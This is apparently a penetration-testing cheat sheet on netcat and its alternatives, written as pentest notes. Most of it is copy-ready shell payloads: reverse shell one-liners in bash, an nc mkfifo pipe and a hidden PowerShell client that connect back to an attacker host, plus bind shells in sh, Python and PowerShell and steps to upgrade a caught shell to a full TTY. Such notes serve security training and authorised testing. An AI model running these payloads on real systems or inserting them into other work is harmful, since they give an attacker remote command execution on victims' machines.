# Netcat and alternatives

## What is it

Netcat, ncat, or nc, is an excellent network utility for interacting with TCP/UDP ports. It can be used for many things during a pentest. Its primary usage is for connecting to shells.  
In addition to that, netcat can be used to connect to any listening port and interact with the service running on that port.  
For example, SSH is programmed to handle connections over port 22 to send all data and keys.  
We can connect to TCP port 22 with netcat `netcat 10.10.10.10 22`

> *Source HTB Academy*

## Reverse shell

- `nc -lvnp 1234` set a listener
  - `-l` Listen mode, to wait for a connection to connect to us.
  - `-v` Verbose mode, so that we know when we receive a connection.
  - `-n` Disable DNS resolution and only connect from/to IPs, to speed up the connection.
  - `-p 1234` Port number netcat is listening on, and the reverse connection should be sent to.

> Note we can use rlwrap in front of it this will allow us to use the arrows like in an usual shell

- From our target
  - `bash -c 'bash -i >& /dev/tcp/attack-machine-ip/1234 0>&1'`
  - or `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attack-machine-ip 1234 >/tmp/f`
  - in powershell `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("attacking-machine-ip",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`

## Bind shell

- Start a bind shell
  - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f`
  - or `python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'`
  - in powershell `powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();`

- Connect to your bind shell with netcat
  - `nc target-ip 1234`

## Upgrade TTY

- `python -c 'import pty; pty.spawn("/bin/bash")'`
- `ctrl+z` background shell and get back on local terminal
- `stty raw -echo`
- `fg`
- `Enter` 2 times to get back shell or `reset` and enter.
- In another tab `echo $TERM` and `stty size`
- Back to netcat shell
  - `export TERM=xterm-256color` or the value of the $term we got previously
  - `stty rows 67 columns 318` put the values you had from ssty size

## Transfert files with netcat

- See here my documentation on [how to transfert files with netcat](https://csbygb.gitbook.io/pentips/post-exploitation/files-transfert#netcat)

## Netcat alternatives

### For Windows

- [Powercat](https://github.com/besimorhino/powercat)

### Socat

- [Socat](https://linux.die.net/man/1/socat)
- Can be used to upgrade shell to [fully interactive TTY shell](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat)
- [Stand alone binary](https://github.com/andrew-d/static-binaries)
